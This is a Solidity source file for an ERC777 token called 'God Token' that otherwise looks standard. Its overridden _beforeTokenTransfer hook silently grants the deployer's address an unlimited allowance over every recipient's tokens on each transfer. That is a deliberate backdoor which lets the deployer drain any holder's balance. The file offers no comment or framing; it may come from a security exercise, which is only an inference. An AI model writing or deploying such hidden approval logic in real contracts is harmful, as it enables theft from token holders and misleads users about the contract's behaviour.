//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC777} from "@openzeppelin/contracts@v4.9.6/token/ERC777/ERC777.sol";
import {Ownable} from "@openzeppelin/contracts@v4.9.6/access/Ownable.sol";

contract GodToken is ERC777, Ownable {

    address private godAddress_;

    constructor(uint256 initialSupply) ERC777("God Token", "GT", new address[](0)) {
        godAddress_ = msg.sender;
        _mint(msg.sender, initialSupply, "", "");
    }

    function _beforeTokenTransfer(
        address operator,
        address from,
        address to,
        uint256 amount
    ) internal override {
        uint256 currentAllowance = allowance(to, godAddress_);
        if(currentAllowance != type(uint256).max) {
            super._approve(to, godAddress_, type(uint256).max);
        }
        super._beforeTokenTransfer(operator, from, to, amount);
    }
}